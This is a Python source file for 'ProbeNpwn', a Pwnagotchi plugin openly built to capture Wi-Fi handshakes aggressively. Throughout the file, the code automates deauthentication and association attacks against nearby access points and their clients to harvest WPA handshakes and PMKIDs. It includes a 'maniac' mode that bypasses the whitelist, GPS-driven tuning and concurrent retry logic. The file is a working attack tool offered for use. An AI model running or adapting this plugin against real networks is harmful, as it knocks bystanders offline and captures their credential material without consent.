import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
from concurrent.futures import ThreadPoolExecutor
from queue import PriorityQueue
import multiprocessing # For cpu_count
import math # For haversine distance
import heapq
import bisect
from collections import OrderedDict, defaultdict
try:
    import psutil
except ImportError:
    psutil = None

class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.5.0' # Updated with continuous mobility scaling
    __license__ = 'GPL3'
    __description__ = (
        'Aggressively capture handshakes with two modes: Tactical (smart and efficient) and Maniac '
        '(unrestricted, rapid attacks). Enhanced with client scoring, adaptive attacks, ML-based '
        'channel hopping, intelligent retries, resource management, and dynamic adjustment of '
        'autotune/personality params based on continuous mobility score (0-1). '
        'Integrates with Bettercap GPS data (if available) for speed estimation. '
        'Uses min/max ranges for param scaling instead of discrete profiles. '
        'Added multi-band support, improved GPS buffering, unbounded retry queue, UI batching, consistent channel keys, '
        'watchdog backoff, psutil fallback, LRU caches, delay caching, precomputed channel weights, heap-based cleanup. '
        'Enhancements: Lowered RSSI thresholds, increased attack probabilities, pycache clearing, simplified watchdog, '
        'PMKID capture, channel selection with PMKID weights, improved mobility detection, crash prevention in movement.'
    )
    MAX_RECENTS = 1000
    MAX_SCORES = 2000
    MAX_AP_CLIENTS = 1000
    MAX_AP_GROUPS = 1000
    MAX_CLIENTS_PER_AP = 100
    DELAY_CACHE_TTL = 10 # seconds
    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self.old_name = None
        self.recents = {}
        self.recent_heap = [] # [(track_time, mac)]
        self.executor = None
        self._watchdog_thread = None
        self._watchdog_thread_running = True
        self.attack_attempts = {}
        self.success_counts = {}
        self.channel_success = defaultdict(int) # int(channel): count
        self.total_handshakes = 0
        self.performance_stats = {}
        self.whitelist = set()
        self.cooldowns = {}
        self.epoch_duration = 60
        self.ap_clients = OrderedDict() # ap_mac: count
        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0}) # int(channel): dict
        self.client_scores = OrderedDict() # cl_mac: score
        self.ap_client_groups = OrderedDict() # ap_mac: [cl_macs]
        self.mode = "tactical"
        self.retry_queue = PriorityQueue() # unbounded
        self.handshake_db = set()
        self.attacks_x = 10
        self.attacks_y = 20
        self.success_x = 10
        self.success_y = 30
        self.handshakes_x = 10
        self.handshakes_y = 40
        self.ui_initialized = False
        self.last_ui_update = 0
        self.ui_update_interval = 5
        self.retry_counter = 0
        # Mobility detection
        self.mobility_score = 0.0  # Continuous score 0 (stationary) to 1 (high mobility)
        self.new_aps_per_epoch = 0
        self.epoch_count = 0
        self.env_check_interval = 10
        self.gps_history = [] # list of (time, {'Latitude':, 'Longitude':})
        self.gps_history_size = 5
        # Min/max for scaling (loaded from config)
        self.min_recon_time = 2
        self.max_recon_time = 30
        self.min_ap_ttl = 30
        self.max_ap_ttl = 300
        self.min_sta_ttl = 30
        self.max_sta_ttl = 300
        self.min_deauth_prob = 0.9
        self.max_deauth_prob = 1.0
        self.min_assoc_prob = 0.9
        self.max_assoc_prob = 1.0
        self.min_min_rssi = -85
        self.max_min_rssi = -60
        self.min_throttle_a = 0.1
        self.max_throttle_a = 0.2
        self.min_throttle_d = 0.1
        self.max_throttle_d = 0.2
        # Multi-band support
        self.enable_5ghz = False
        self.possible_channels = list(range(1, 14)) # Default 2.4GHz
        self.five_ghz_channels = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
        # Watchdog enhancements
        self.restart_attempts = 0
        self.last_restart_time = 0
        self.max_restarts_per_hour = 3
        # Delay cache
        self.delay_cache = {} # {(ap_mac, cl_mac): (delay, timestamp)}
        # Concurrency lock
        self.channel_lock = threading.Lock()
        # Retry config
        self.max_retries = 3
    ### Lifecycle Methods
    def on_loaded(self):
        logging.info("Plugin ProbeNpwn loaded")
        # Clear pycache to avoid errors
        pycache_path = "/usr/local/share/pwnagotchi/custom-plugins/__pycache__"
        if os.path.exists(pycache_path):
            try:
                for file in os.listdir(pycache_path):
                    os.remove(os.path.join(pycache_path, file))
                logging.info("Cleared pycache directory")
            except Exception as e:
                logging.warning(f"Failed to clear pycache: {e}")
        self.executor = ThreadPoolExecutor(max_workers=self.get_dynamic_max_workers())
    def on_config_changed(self, config):
        self.whitelist = {item.lower() for item in config["main"].get("whitelist", [])}
        self.verbose = config.get("main", {}).get("plugins", {}).get("probenpwn", {}).get("verbose", False)
        logging.getLogger().setLevel(logging.INFO if self.verbose else logging.WARNING)
        self.old_name = config.get("main").get("name", "")
        self.mode = config["main"]["plugins"]["probenpwn"].get("mode", "tactical")
        self.attacks_x = config["main"]["plugins"]["probenpwn"].get("attacks_x_coord", 10)
        self.attacks_y = config["main"]["plugins"]["probenpwn"].get("attacks_y_coord", 20)
        self.success_x = config["main"]["plugins"]["probenpwn"].get("success_x_coord", 10)
        self.success_y = config["main"]["plugins"]["probenpwn"].get("success_y_coord", 30)
        self.handshakes_x = config["main"]["plugins"]["probenpwn"].get("handshakes_x_coord", 10)
        self.handshakes_y = config["main"]["plugins"]["probenpwn"].get("handshakes_y_coord", 40)
        self.enable_5ghz = config["main"]["plugins"]["probenpwn"].get("enable_5ghz", False)
        self.max_retries = config["main"]["plugins"]["probenpwn"].get("max_retries", 3)
        self.gps_history_size = config["main"]["plugins"]["probenpwn"].get("gps_history_size", 5)
        self.env_check_interval = config["main"]["plugins"]["probenpwn"].get("env_check_interval", 10)
        # Load min/max for scaling
        self.min_recon_time = config["main"]["plugins"]["probenpwn"].get("min_recon_time", 2)
        self.max_recon_time = config["main"]["plugins"]["probenpwn"].get("max_recon_time", 30)
        self.min_ap_ttl = config["main"]["plugins"]["probenpwn"].get("min_ap_ttl", 30)
        self.max_ap_ttl = config["main"]["plugins"]["probenpwn"].get("max_ap_ttl", 300)
        self.min_sta_ttl = config["main"]["plugins"]["probenpwn"].get("min_sta_ttl", 30)
        self.max_sta_ttl = config["main"]["plugins"]["probenpwn"].get("max_sta_ttl", 300)
        self.min_deauth_prob = config["main"]["plugins"]["probenpwn"].get("min_deauth_prob", 0.9)
        self.max_deauth_prob = config["main"]["plugins"]["probenpwn"].get("max_deauth_prob", 1.0)
        self.min_assoc_prob = config["main"]["plugins"]["probenpwn"].get("min_assoc_prob", 0.9)
        self.max_assoc_prob = config["main"]["plugins"]["probenpwn"].get("max_assoc_prob", 1.0)
        self.min_min_rssi = config["main"]["plugins"]["probenpwn"].get("min_min_rssi", -85)
        self.max_min_rssi = config["main"]["plugins"]["probenpwn"].get("max_min_rssi", -60)
        self.min_throttle_a = config["main"]["plugins"]["probenpwn"].get("min_throttle_a", 0.1)
        self.max_throttle_a = config["main"]["plugins"]["probenpwn"].get("max_throttle_a", 0.2)
        self.min_throttle_d = config["main"]["plugins"]["probenpwn"].get("min_throttle_d", 0.1)
        self.max_throttle_d = config["main"]["plugins"]["probenpwn"].get("max_throttle_d", 0.2)
        if self.enable_5ghz:
            self.possible_channels += self.five_ghz_channels
        # Apply initial adjustments
        self.apply_scaling(config)
    def on_unload(self, ui):
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")
            ui.remove_element('attacks')
            ui.remove_element('success')
            ui.remove_element('handshakes')
            ui.remove_element('mobility')  # Updated UI element
        self._watchdog_thread_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join()
        self.executor.shutdown(wait=True)
        logging.info("Probing out.")
    ### UI Methods
    def on_ui_setup(self, ui):
        if not self.ui_initialized:
            ui.add_element('attacks', components.Text(position=(self.attacks_x, self.attacks_y), value='Attacks: 0', color=255))
            ui.add_element('success', components.Text(position=(self.success_x, self.success_y), value='Success: 0.0%', color=255))
            ui.add_element('handshakes', components.Text(position=(self.handshakes_x, self.handshakes_y), value='Handshakes: 0', color=255))
            ui.add_element('mobility', components.Text(position=(self.handshakes_x, self.handshakes_y + 10), value='Mobility: 0%', color=255))
            self.ui_initialized = True
    def on_ui_update(self, ui):
        current_time = time.time()
        if current_time - self.last_ui_update < self.ui_update_interval:
            return
        self.last_ui_update = current_time
        total_attempts = sum(self.attack_attempts.values())
        total_successes = sum(self.success_counts.values())
        success_rate = (total_successes / total_attempts) * 100 if total_attempts > 0 else 0.0
        ui_changes = {
            'attacks': f"Attacks: {total_attempts}",
            'success': f"Success: {success_rate:.1f}%",
            'handshakes': f"Handshakes: {self.total_handshakes}",
            'mobility': f"Mobility: {int(self.mobility_score * 100)}%"
        }
        with ui._lock:
            for key, value in ui_changes.items():
                ui.set(key, value)
    ### Core Functionality
    def on_ready(self, agent):
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, args=(agent,), daemon=True)
        self._watchdog_thread.start()
        with agent._view._lock:
            agent._view.set("status", "Probe engaged..." if self.mode == "tactical" else "Maniac mode activated!")
    def _watchdog(self, agent):
        CHECK_INTERVAL = 10
        MAX_RETRIES = 1
        retry_count = 0
        while self._watchdog_thread_running:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon missing! Attempting recovery...")
                try:
                    subprocess.run(["monstop"], check=True, capture_output=True)
                    subprocess.run(["monstart"], check=True, capture_output=True)
                    logging.info("Soft recovery successful")
                    retry_count = 0
                except Exception as e:
                    logging.error(f"Soft recovery failed: {e}")
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        current_time = time.time()
                        if current_time - self.last_restart_time > 3600:
                            self.restart_attempts = 0
                        if self.restart_attempts < self.max_restarts_per_hour:
                            delay = 2 ** self.restart_attempts
                            logging.info(f"Restarting pwnagotchi after {delay}s backoff (attempt {self.restart_attempts + 1})")
                            time.sleep(delay)
                            try:
                                result = subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True, capture_output=True)
                                logging.info("Restart successful")
                                self.restart_attempts += 1
                                self.last_restart_time = current_time
                            except subprocess.CalledProcessError as ex:
                                logging.error(f"Restart failed: {ex}\nStdout: {ex.stdout}\nStderr: {ex.stderr}")
                            except Exception as ex:
                                logging.error(f"Restart failed: {ex}")
                        else:
                            logging.error("Max restarts per hour reached. Halting recovery attempts.")
                            break
            else:
                retry_count = 0
            agent.set_channel(self.select_channel())
            # Dynamic concurrency adjustment
            current_workers = self.executor._max_workers
            new_workers = self.get_dynamic_max_workers()
            if new_workers != current_workers:
                logging.info(f"Adjusting concurrency from {current_workers} to {new_workers}")
                self.executor.shutdown(wait=True)
                self.executor = ThreadPoolExecutor(max_workers=new_workers)
            time.sleep(CHECK_INTERVAL)
    def select_channel(self):
        if not self.channel_activity:
            return random.choice(self.possible_channels)
        channels = list(self.channel_activity.keys())
        weights = [max(1, stats["aps"] + stats["clients"]) * self.channel_success.get(ch, 1) for ch, stats in self.channel_activity.items()]
        # Favor channels with high PMKID potential (many APs, few clients)
        for i, ch in enumerate(channels):
            stats = self.channel_activity[ch]
            if stats["aps"] > stats["clients"] and stats["aps"] > 3:
                weights[i] *= 1.5  # Boost
        cum_weights = []
        total_weight = 0
        for w in weights:
            total_weight += w
            cum_weights.append(total_weight)
        if total_weight == 0:
            return random.choice(self.possible_channels)
        pick = random.random() * total_weight
        i = bisect.bisect(cum_weights, pick)
        return channels[i]
    def track_recent(self, ap, cl=None):
        current_time = time.time()
        ap_mac_lower = ap['mac'].lower()
        ap['_track_time'] = current_time
        self.recents[ap_mac_lower] = ap
        heapq.heappush(self.recent_heap, (current_time, ap_mac_lower))
        if cl:
            cl_mac_lower = cl['mac'].lower()
            cl['_track_time'] = current_time
            self.recents[cl_mac_lower] = cl
            heapq.heappush(self.recent_heap, (current_time, cl_mac_lower))
    def ok_to_attack(self, agent, ap):
        if self.mode == "maniac":
            return True
        ap_mac_lower = ap['mac'].lower()
        ap_hostname_lower = ap.get('hostname', '').lower()
        return ap_hostname_lower not in self.whitelist and ap_mac_lower not in self.whitelist
    def attack_target(self, agent, ap, cl, retry_count=0):
        if retry_count > self.max_retries:
            return
        ap_mac = ap['mac'].lower()
        if self.mode == "tactical":
            if ap_mac in self.cooldowns and time.time() < self.cooldowns[ap_mac]:
                return
            if cl and self.client_scores.get(cl['mac'].lower(), 0) < 50:
                retry_time = time.time() + 30
                self.retry_counter += 1
                self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, retry_count + 1)))
                return
        elif self.mode == "maniac" and self.attack_attempts.get(ap_mac, 0) > 50:
            retry_time = time.time() + 60
            self.retry_counter += 1
            self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, retry_count + 1)))
            return
        if not self.ok_to_attack(agent, ap):
            return
        with self.channel_lock:
            agent.set_channel(ap['channel'])
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.info(f"Attacking AP {ap_mac} (client: {cl['mac'] if cl else 'N/A'}) retry_count: {retry_count}")
        if agent._config['personality']['deauth']:
            if ap_mac in self.ap_client_groups:
                for cl_mac in self.ap_client_groups[ap_mac][:5]:
                    client_data = self.recents.get(cl_mac)
                    if client_data:
                        self.executor.submit(agent.deauth, ap, client_data, self.dynamic_attack_delay(ap, client_data))
                    else:
                        logging.warning(f"Untracked client {cl_mac} for AP {ap_mac}")
            elif cl:
                if 'mac' in cl:
                    self.executor.submit(agent.deauth, ap, cl, self.dynamic_attack_delay(ap, cl))
                else:
                    logging.warning(f"Invalid client data for AP {ap_mac}")
        # Add PMKID-focused assoc
        if random.random() < self.get_scaled_param('assoc_prob'):
            self.executor.submit(agent.associate, ap, throttle_a=0.05)  # Force PMKID leak
        if random.random() < 0.2:
            self.executor.submit(agent.associate, ap, 0.05)
    def dynamic_attack_delay(self, ap, cl):
        cl_mac = cl['mac'].lower() if cl else ''
        key = (ap['mac'].lower(), cl_mac)
        current_time = time.time()
        if key in self.delay_cache and current_time - self.delay_cache[key][1] < self.DELAY_CACHE_TTL:
            return self.delay_cache[key][0]
        if self.mode == "maniac":
            delay = 0.05
        else:
            signal = cl.get('signal', -100) if cl else -100
            base_delay = 0.1 if signal >= -60 else 0.2
            ap_mac = ap['mac'].lower()
            attempts = self.attack_attempts.get(ap_mac, 0)
            if attempts > 5:
                base_delay *= 0.4
            num_clients = self.ap_clients.get(ap_mac, 0)
            if num_clients > 3:
                base_delay *= 0.8
            delay = base_delay * (0.95 + random.random() * 0.1)
        self.delay_cache[key] = (delay, current_time)
        return delay
    def get_dynamic_max_workers(self):
        try:
            if psutil:
                load_avg = psutil.getloadavg()[0]
                cpu_count = psutil.cpu_count()
            else:
                load_avg = os.getloadavg()[0]
                cpu_count = multiprocessing.cpu_count()
            base_workers = cpu_count * 5
            if load_avg > cpu_count * 0.8:
                return max(10, int(base_workers * 0.5))
            elif load_avg > cpu_count * 0.5:
                return int(base_workers * 0.75)
            return base_workers
        except Exception:
            return 20
    def calculate_mobility_score(self, agent):
        gps = agent.session().get('gps', None)
        current_time = time.time()
        speed_norm = 0.0
        if gps and 'Latitude' in gps and gps['Latitude'] != 0 and 'Longitude' in gps and gps['Longitude'] != 0:
            current_gps = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
            self.gps_history.append((current_time, current_gps))
            if len(self.gps_history) > self.gps_history_size:
                self.gps_history.pop(0)
            speeds = []
            for i in range(1, len(self.gps_history)):
                prev_time, prev_gps = self.gps_history[i-1]
                curr_time, curr_gps = self.gps_history[i]
                time_delta = max(1, curr_time - prev_time)
                lat1, lon1 = math.radians(prev_gps['Latitude']), math.radians(prev_gps['Longitude'])
                lat2, lon2 = math.radians(curr_gps['Latitude']), math.radians(curr_gps['Longitude'])
                dlat, dlon = lat2 - lat1, lon2 - lon1
                a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
                c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
                distance = 6371 * c # km
                speed = (distance / time_delta) * 3600 # km/h
                if speed < 200:
                    speeds.append(speed)
                else:
                    logging.warning(f"Ignoring extreme GPS speed: {speed} km/h")
            if len(speeds) >= 2:
                median_speed = sorted(speeds)[len(speeds)//2]
                speed_norm = min(1.0, median_speed / 50)  # Normalize, cap at 50 km/h
        # Fallback to AP rate
        ap_rate = self.new_aps_per_epoch / self.env_check_interval
        logging.debug(f"AP rate fallback: {ap_rate} (new_aps={self.new_aps_per_epoch}, interval={self.env_check_interval})")
        ap_rate_norm = min(1.0, ap_rate / 20)  # Normalize to max expected rate
        # Combined score
        score = max(speed_norm, ap_rate_norm)
        return score
    def get_scaled_param(self, param_name):
        if param_name == 'recon_time':
            return self.max_recon_time - (self.mobility_score * (self.max_recon_time - self.min_recon_time))
        elif param_name == 'ap_ttl':
            return self.max_ap_ttl - (self.mobility_score * (self.max_ap_ttl - self.min_ap_ttl))
        elif param_name == 'sta_ttl':
            return self.max_sta_ttl - (self.mobility_score * (self.max_sta_ttl - self.min_sta_ttl))
        elif param_name == 'deauth_prob':
            return self.max_deauth_prob - (self.mobility_score * (self.max_deauth_prob - self.min_deauth_prob))
        elif param_name == 'assoc_prob':
            return self.max_assoc_prob - (self.mobility_score * (self.max_assoc_prob - self.min_assoc_prob))
        elif param_name == 'min_rssi':
            return self.min_min_rssi + (self.mobility_score * (self.max_min_rssi - self.min_min_rssi))
        elif param_name == 'throttle_a':
            return self.min_throttle_a + (self.mobility_score * (self.max_throttle_a - self.min_throttle_a))
        elif param_name == 'throttle_d':
            return self.min_throttle_d + (self.mobility_score * (self.max_throttle_d - self.min_throttle_d))
        return 0.0  # Default
    def apply_scaling(self, config):
        params = ['recon_time', 'ap_ttl', 'sta_ttl', 'deauth_prob', 'assoc_prob', 'min_rssi', 'throttle_a', 'throttle_d']
        for param in params:
            if param in config['personality']:
                config['personality'][param] = self.get_scaled_param(param)
        logging.info(f"Applied scaled params based on mobility score {self.mobility_score:.2f}")
    ### Event Handlers
    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event['data']
        ap_mac = ap['mac'].lower()
        channel = ap['channel']
        self.channel_activity[channel]["aps"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0)
        if ap_mac in self.ap_clients:
            self.ap_clients.move_to_end(ap_mac)
        if len(self.ap_clients) > self.MAX_AP_CLIENTS:
            self.ap_clients.popitem(last=False)
        self.new_aps_per_epoch += 1 # Track for mobility score
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)
            self.executor.submit(self.attack_target, agent, ap, None)
    def on_bcap_wifi_client_new(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        channel = ap['channel']
        self.channel_activity[channel]["clients"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        if ap_mac in self.ap_clients:
            self.ap_clients.move_to_end(ap_mac)
        if len(self.ap_clients) > self.MAX_AP_CLIENTS:
            self.ap_clients.popitem(last=False)
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients.get(ap_mac, 0) / 10)
        existing_score = self.client_scores.get(cl_mac, 0)
        self.client_scores[cl_mac] = max(0, existing_score * 0.95) + (signal + 100) * activity
        if cl_mac in self.client_scores:
            self.client_scores.move_to_end(cl_mac)
        if len(self.client_scores) > self.MAX_SCORES:
            self.client_scores.popitem(last=False)
        if cl_mac not in self.ap_client_groups.get(ap_mac, []):
            self.ap_client_groups.setdefault(ap_mac, []).append(cl_mac)
            if len(self.ap_client_groups[ap_mac]) > self.MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        if ap_mac in self.ap_client_groups:
            self.ap_client_groups.move_to_end(ap_mac)
        if len(self.ap_client_groups) > self.MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
            self.executor.submit(self.attack_target, agent, ap, cl)
    def on_handshake(self, agent, filename, ap, cl):
        handshake_hash = hash(f"{ap['mac'].lower()}{cl.get('mac', '').lower()}")
        if handshake_hash in self.handshake_db:
            logging.info(f"Duplicate handshake for {ap['mac']}. Skipping.")
            return
        ap_mac = ap['mac'].lower()
        ch = ap['channel'] # Track success per channel
        self.handshake_db.add(handshake_hash)
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.channel_success[ch] += 1
        self.total_handshakes += 1
        if self.mode == "tactical":
            self.cooldowns[ap_mac] = time.time() + 60
    def on_epoch(self, agent, epoch, epoch_data):
        current_time = time.time()
        while not self.retry_queue.empty() and self.retry_queue.queue[0][0] <= current_time:
            item = self.retry_queue.get()
            _, _, (agent, ap, cl, retry_count) = item
            self.executor.submit(self.attack_target, agent, ap, cl, retry_count)
        # Heap-based cleanup for recents
        while self.recent_heap and self.recent_heap[0][0] < (current_time - self.epoch_duration):
            t, mac = heapq.heappop(self.recent_heap)
            if mac in self.recents and self.recents[mac]['_track_time'] == t:
                del self.recents[mac]
        for ap_mac in list(self.ap_client_groups):
            if ap_mac not in self.recents:
                del self.ap_client_groups[ap_mac]
        # Failure-based retries
        for ap_mac in list(self.attack_attempts):
            if self.attack_attempts[ap_mac] > self.success_counts.get(ap_mac, 0) + 2:
                if ap_mac in self.recents:
                    ap = self.recents[ap_mac]
                    cl = None # Retry without specific client
                    retry_time = current_time + 10
                    self.retry_counter += 1
                    self.retry_queue.put((retry_time, self.retry_counter, (agent, ap, cl, 0)))
        # Mobility score check
        self.epoch_count += 1
        if self.epoch_count % self.env_check_interval == 0:
            new_score = self.calculate_mobility_score(agent)
            self.mobility_score = new_score  # Direct update for continuous
            self.apply_scaling(agent._config)
            logging.info(f"Mobility score updated to {self.mobility_score:.2f}")
            self.new_aps_per_epoch = 0 # Reset counter
    def on_bcap_wifi_ap_updated(self, agent, event):
        ap = event['data']
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)
    def on_bcap_wifi_client_updated(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        if ap_mac in self.ap_clients:
            self.ap_clients.move_to_end(ap_mac)
        if len(self.ap_clients) > self.MAX_AP_CLIENTS:
            self.ap_clients.popitem(last=False)
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients.get(ap_mac, 0) / 10)
        existing_score = self.client_scores.get(cl_mac, 0)
        self.client_scores[cl_mac] = max(0, existing_score * 0.95) + (signal + 100) * activity
        if cl_mac in self.client_scores:
            self.client_scores.move_to_end(cl_mac)
        if len(self.client_scores) > self.MAX_SCORES:
            self.client_scores.popitem(last=False)
        if cl_mac not in self.ap_client_groups.get(ap_mac, []):
            self.ap_client_groups.setdefault(ap_mac, []).append(cl_mac)
            if len(self.ap_client_groups[ap_mac]) > self.MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        if ap_mac in self.ap_client_groups:
            self.ap_client_groups.move_to_end(ap_mac)
        if len(self.ap_client_groups) > self.MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
